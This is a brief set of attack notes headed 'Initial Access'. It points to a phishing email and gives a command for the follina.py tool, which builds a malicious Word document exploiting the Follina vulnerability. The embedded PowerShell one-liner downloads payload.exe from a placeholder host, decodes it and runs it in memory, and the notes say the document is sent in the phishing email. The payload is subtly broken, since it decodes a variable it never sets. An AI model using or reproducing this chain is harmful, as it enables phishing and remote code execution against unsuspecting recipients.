 # Initial Access

## Email

See .msg file for phishing email.


## Folina 

https://github.com/chvancooten/follina.py

```bash
python .\follina.py -t docx -m command -c "$bytes = (Invoke-WebRequest \"https://<url>/payload.exe\" -UseBasicParsing ).Content;$bytes = [System.Convert]::FromBase64String($string);$assembly = [System.Reflection.Assembly]::Load($bytes);$entryPointMethod = $assembly.GetTypes().Where({ $_.Name -eq 'Program' }, 'First').GetMethod('Main', [Reflection.BindingFlags] 'Static, Public, NonPublic');$entryPointMethod.Invoke($null, (, [string[]] ('foo', 'bar')))"
```

This docx file is included in the email.


